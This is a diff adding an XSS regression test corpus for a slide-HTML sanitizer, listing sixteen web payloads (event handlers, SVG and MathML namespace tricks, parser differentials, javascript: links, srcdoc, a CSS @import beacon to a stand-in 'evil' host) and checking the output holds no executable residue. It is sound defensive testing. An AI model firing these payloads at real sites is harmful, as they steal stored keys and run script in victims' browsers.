@@ -59,6 +59,48 @@ describe('sanitizeSlideHtml — preserves legitimate engine output', () => {
 	});
 });
 
+// The permanent XSS regression corpus (#616). Every payload here was confirmed
+// neutralized — several by an adversarial red-team pass that ran them in REAL
+// Chromium with a key-exfil harness (mXSS / namespace-confusion / parser-differential
+// leads that jsdom alone can't be trusted on). Any payload we ever find stays here,
+// asserted dead forever — a new sanitizer regression must defeat the whole corpus.
+const XSS_CORPUS: [name: string, payload: string][] = [
+  ['img onerror', '<img src=x onerror="parent.postMessage(parent.localStorage.k,\'*\')">'],
+  ['svg onload', '<svg onload="parent.postMessage(1,\'*\')"></svg>'],
+  ['svg script', '<svg><script>parent.postMessage(1,"*")</script></svg>'],
+  ['svg foreignObject html', '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>'],
+  ['math mglyph mtext namespace', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
+  ['annotation-xml text/html', '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>'],
+  ['noscript parser differential', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
+  ['template reparse', '<template><img src=x onerror=alert(1)></template>'],
+  ['noembed/xmp rawtext', '<noembed><img src=x onerror=alert(1)></noembed><xmp><img src=x onerror=alert(1)></xmp>'],
+  ['svg use data:', '<svg><use href="data:image/svg+xml,&lt;svg id=x xmlns=\'http://www.w3.org/2000/svg\'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;#x"></use></svg>'],
+  ['svg animate javascript:', '<svg><a><animate attributeName=href values="javascript:alert(1)"/><text x=10 y=10>x</text></a></svg>'],
+  ['set attributeName=onload', '<svg><set attributeName=onload to=alert(1)></set></svg>'],
+  ['a href javascript:', '<a href="javascript:parent.postMessage(parent.localStorage.k,\'*\')">x</a>'],
+  ['iframe srcdoc', '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>'],
+  ['style import beacon', '<style>@import url(//evil/?leak)</style>'],
+  ['inline style expression', '<div style="x:expression(alert(1))">x</div>'],
+];
+
+describe('sanitizeSlideHtml — XSS regression corpus (#616)', () => {
+  for (const [name, payload] of XSS_CORPUS) {
+    it(`neutralizes: ${name}`, () => {
+      const out = sanitizeSlideHtml(payload);
+      // No executable residue survives: no event handler, no <script>, no
+      // javascript:/expression(), no live <iframe>/<foreignObject>/srcdoc.
+      expect(out).not.toMatch(/\son\w+\s*=/i);
+      expect(out).not.toMatch(/<script/i);
+      expect(out).not.toMatch(/javascript:/i);
+      expect(out).not.toMatch(/expression\s*\(/i);
+      expect(out).not.toMatch(/<iframe/i);
+      expect(out).not.toMatch(/srcdoc/i);
+      expect(out).not.toMatch(/<foreignObject/i);
+      expect(out).not.toMatch(/@import/i);
+    });
+  }
+});
+
 // Integration: prove the WIRING — buildSrcdoc (the multi-slide builder, also used
 // by the export capture frame) sanitizes its `html` before it reaches the srcdoc,
 // not just the standalone helper. The Node frame-assembly tests run without a DOM
